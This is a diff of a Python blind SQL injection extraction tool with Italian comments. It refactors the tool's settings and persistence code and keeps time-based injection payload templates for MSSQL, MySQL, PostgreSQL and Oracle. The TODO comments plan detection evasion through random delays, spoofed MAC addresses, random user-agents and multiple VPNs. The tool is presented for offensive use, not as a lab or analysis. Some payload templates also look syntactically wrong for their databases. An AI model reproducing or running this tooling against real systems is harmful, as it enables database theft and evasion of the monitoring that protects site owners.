@@ -1,38 +1,92 @@
-import os
-import json
+from pathlib import Path
 import requests
 import sys
 import time
-from data_classes import Settings, ExtractedData
+from typing import Any
+from data_classes import Settings, ExtractedData, optimizer, sql_types
+PROJECT_ROOT = Path(__file__).resolve().parents[2]
+if str(PROJECT_ROOT) not in sys.path:
+    sys.path.insert(0, str(PROJECT_ROOT))
+from utility.persistence import PersistenceUtility
+
+
+# TODO: implementare multi-threading per estrazione dei dati in parallelo (ad esempio mentre conta la lunghezza del nome altri thread cercano di estrarre i primi 3 caratteri e poi i restanti in parallelo) - lasciare sempre un thread libero
+# TODO: implementare delay/sleep con valori casuali per rendere l'estrazione meno rilevabile
+# TODO: implementare multi connessioni: ovvero + interfacce virtuali con MAC diversi (random) e user-agent diversi (random) sarebbe interessante anche che fossero collegate a VPN diverse
 
 
 class BlindSQLIExtractorBase:
     settings: Settings
     extracted_data: ExtractedData
-    data_file_name: str = "sqli_data.json"
+    data_file_name: str
+    persistence: PersistenceUtility
 
 
     def __init__(self):
         self.settings = Settings()
         self.extracted_data = ExtractedData()
+        self.persistence = PersistenceUtility(self)
+        self.data_file_name = self.persistence.file_name
 
-    def set_delay(self, delay: int):
-        self.settings.delay = delay
-    def set_url(self, url: str):
-        normalized_url = url.strip()
-        if not normalized_url.startswith(("http://", "https://")):
-            normalized_url = f"http://{normalized_url}"
-        self.settings.url = normalized_url
-    def set_sql_type(self, sql_type: str):
-        if sql_type.upper() in ["MSSQL", "MYSQL", "POSTGRESQL", "ORACLE"]:
-            self.settings.sql_type = sql_type.upper()
-        else:
-            print("SQL_TYPE non valido. Valori accettati: MSSQL, MYSQL, POSTGRESQL, ORACLE")
-            return
-    def set_post_parameters(self, post_query: str):
-        self.settings.post_parameters = post_query
-    def set_get_parameters(self, get_query: str):
-        self.settings.get_parameters = get_query
+    def set_setting(self, key: str, value: Any) -> bool:
+        if key not in Settings.__dataclass_fields__:
+            print(f"Setting '{key}' non valido.")
+            return False
+
+        if key == "sql_type":
+            value = str(value).lower().strip()
+            if value not in sql_types:
+                print(f"SQL_TYPE non valido. Valori accettati: {', '.join(sql_types)}")
+                return False
+        elif key == "optimizer":
+            value = str(value).lower().strip()
+            if value not in optimizer:
+                print(f"Optimizer non valido. Valori accettati: {', '.join(optimizer)}")
+                return False
+        elif key == "url":
+            value = str(value).strip()
+            if value and not value.startswith(("http://", "https://")):
+                value = f"http://{value}"
+        elif key in {"delay", "request_timeout", "max_retries"}:
+            try:
+                value = int(value)
+            except (TypeError, ValueError):
+                print(f"{key} non valido. Deve essere un intero.")
+                return False
+
+            if key in {"request_timeout", "max_retries"} and value <= 0:
+                print(f"{key} non valido. Deve essere > 0")
+                return False
+        elif key == "retry_delay":
+            try:
+                value = float(value)
+            except (TypeError, ValueError):
+                print("retry_delay non valido. Deve essere un numero.")
+                return False
+
+            if value < 0:
+                print("retry_delay non valido. Deve essere >= 0")
+                return False
+        elif key in {"verbose", "hurry_up"} and isinstance(value, str):
+            value = value.strip().lower() in {"1", "true", "yes", "y", "on"}
+
+        setattr(self.settings, key, value)
+        return True
+    def get_setting(self, key: str, default: Any = None) -> Any:
+        if key not in Settings.__dataclass_fields__:
+            return default
+        return getattr(self.settings, key, default)
+    def __getattr__(self, name: str):
+        if name.startswith("set_"):
+            k = name[4:]
+            if k in Settings.__dataclass_fields__:
+                return lambda v: self.set_setting(k, v)
+        if name.startswith("get_"):
+            k = name[4:]
+            if k in Settings.__dataclass_fields__:
+                return lambda default=None: self.get_setting(k, default)
+        raise AttributeError(name)
+    
     def set_header_parameters(self, header: object):
         parameters = header.strip().split(":", 1)
         if len(parameters) != 2:
@@ -65,31 +119,6 @@ class BlindSQLIExtractorBase:
             return
 
         self.settings.parameter_target = parameter
-    def set_verbose(self, verbose: bool):
-        self.settings.verbose = verbose
-    def set_optimizer(self, optimizer: str):
-        if optimizer.lower() in ["anding", "bisection"]:
-            self.settings.optimizer = optimizer.lower()
-        else:
-            print("Optimizer non valido. Valori accettati: anding, bisection")
-            return
-    def set_delimiter(self, delimiter: str):
-        self.settings.delimiter = delimiter
-    def set_request_timeout(self, request_timeout: int):
-        if request_timeout <= 0:
-            print("request_timeout non valido. Deve essere > 0")
-            return
-        self.settings.request_timeout = request_timeout
-    def set_max_retries(self, max_retries: int):
-        if max_retries <= 0:
-            print("max_retries non valido. Deve essere > 0")
-            return
-        self.settings.max_retries = max_retries
-    def set_retry_delay(self, retry_delay: float):
-        if retry_delay < 0:
-            print("retry_delay non valido. Deve essere >= 0")
-            return
-        self.settings.retry_delay = retry_delay
 
     def add_header_parameters(self, header: object):
         if not self.settings.header_parameters:
@@ -115,13 +144,13 @@ class BlindSQLIExtractorBase:
         return encoded_query
 
     def get_delayed_query(self, q):
-        if "MSSQL" == self.settings.sql_type:
+        if "mssql" == self.settings.sql_type:
             query = f"';IF({q}) WAITFOR DELAY '0:0:{self.settings.delay}'--"
-        elif "MYSQL" == self.settings.sql_type:
+        elif "mysql" == self.settings.sql_type:
             query = f"';IF({q}) THEN SLEEP({self.settings.delay})--"
-        elif "POSTGRESQL" == self.settings.sql_type:
+        elif "postgresql" == self.settings.sql_type:
             query = f"';IF({q}) THEN PG_SLEEP({self.settings.delay})--"
-        elif "ORACLE" == self.settings.sql_type:
+        elif "oracle" == self.settings.sql_type:
             query = f"';IF({q}) THEN DBMS_LOCK.SLEEP({self.settings.delay})--"
         else:
             query = ""
@@ -306,67 +335,44 @@ class BlindSQLIExtractorBase:
         print("\r\n")
         return val
 
-    def check_saved_settings(self):
-        return os.path.isfile(self.data_file_name)
-
-    def _merge_settings_with_defaults(self, saved_settings):
-        default_settings = Settings()
-        merged_settings = dict(default_settings.__dict__)
-
-        if isinstance(saved_settings, Settings):
-            saved_settings = saved_settings.__dict__
-
-        if not isinstance(saved_settings, dict):
-            raise TypeError("saved_settings deve essere un dict o un'istanza di Settings")
-
-        for key, value in saved_settings.items():
-            if key not in merged_settings:
-                continue
-            merged_settings[key] = value
-
-        if not isinstance(merged_settings.get("header_parameters"), dict):
-            merged_settings["header_parameters"] = {}
-
-        return Settings(**merged_settings)
     
-    def load_saved_data(self):
-        if not self.check_saved_settings():
-            print("Non sono state trovate impostazioni salvate.")
-            return None
-
+    def use_saved_settings(self):
         try:
-            with open(self.data_file_name, "r") as f:
-                data = json.load(f)
+            merged_settings = self.persistence.merge_with_defaults(
+                defaults=Settings(),
+                payload=self.persistence.saved_data.get("settings"),
+                strict_keys=True,
+            )
+            if not isinstance(merged_settings.get("header_parameters"), dict):
+                merged_settings["header_parameters"] = {}
 
-                return data
-            
-        except Exception as e:
-            print(f"Errore durante il caricamento delle impostazioni: {e}")
-            return None
-        
-    def restore_saved_settings(self, saved_settings: Settings):
-        try:
-            self.settings = self._merge_settings_with_defaults(saved_settings)
+            self.settings = Settings(**merged_settings)
+
             return self.settings
+        
         except Exception as e:
             print(f"Errore durante il ripristino delle impostazioni: {e}")
             return None
         
-    def restore_extracted_data(self, saved_data: dict):
+    def use_extracted_data(self):
         try:
-            if "extracted_data" in saved_data:
-                self.extracted_data = ExtractedData(**saved_data["extracted_data"])
+            extracted_payload = self.persistence.saved_data.get("extracted_data")
+            if not isinstance(extracted_payload, dict):
+                print("Errore durante il ripristino dei dati: payload non valido.")
+                return None
+
+            self.extracted_data = ExtractedData(**extracted_payload)
+            return self.extracted_data
         except Exception as e:
             print(f"Errore durante il ripristino dei dati: {e}")
             return None
 
     def save_extracted_data(self):
         data_to_save = {
-            "settings": self.settings.__dict__,
-            "extracted_data": self.extracted_data.__dict__,
+            "settings": self.persistence.to_serializable(self.settings),
+            "extracted_data": self.persistence.to_serializable(self.extracted_data),
         }
-        try:
-            with open(self.data_file_name, "w") as f:
-                json.dump(data_to_save, f, indent=4)
-        except Exception as e:
-            print(f"Errore durante il salvataggio dei dati: {e}")
+        return self.persistence.save_data(
+            data_to_save,
+            indent=4,
+        )
